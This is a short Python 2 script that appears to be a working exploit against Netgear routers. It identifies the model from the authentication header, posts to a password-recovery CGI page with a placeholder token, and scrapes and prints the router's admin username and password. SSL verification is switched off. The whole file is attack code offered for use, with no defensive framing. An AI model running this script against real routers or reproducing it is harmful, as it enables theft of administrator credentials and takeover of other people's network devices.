## netgore2.py
import sys
import requests

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
        return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
	r = requests.get(url)
except:
	url = 'https://' + ip + ':' + port + '/'
	r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
	print "Attcking: " + model[13:-1]
else:
	print "not a netgear router"
	sys.exit(0)
#2nd stage
url = url + 'passwordrecovered.cgi?id=TOKEN'
try:
	r = requests.post(url, verify=False)
except:
	print "not vulnerable router"
	sys.exit(0)
#profit
print(r.text)
if r.text.find('left\">') != -1:
	username = (repr(scrape(r.text, 'Router Admin Username</td>', '</td>')))
	username = scrape(username, '>', '\'')
	password = (repr(scrape(r.text, 'Router Admin Password</td>', '</td>')))
	password = scrape(password, '>', '\'')
	if username == "i_dont_speak_english":
		username = (scrape(r.text[r.text.find('left\">'):-1], 'left\">', '</td>'))
		password = (scrape(r.text[r.text.rfind('left\">'):-1], 'left\">', '</td>'))
else:
	print "not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again"
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&#35;","#")
password = password.replace("&#38;","&")
print "user: " + username
print "pass: " + password
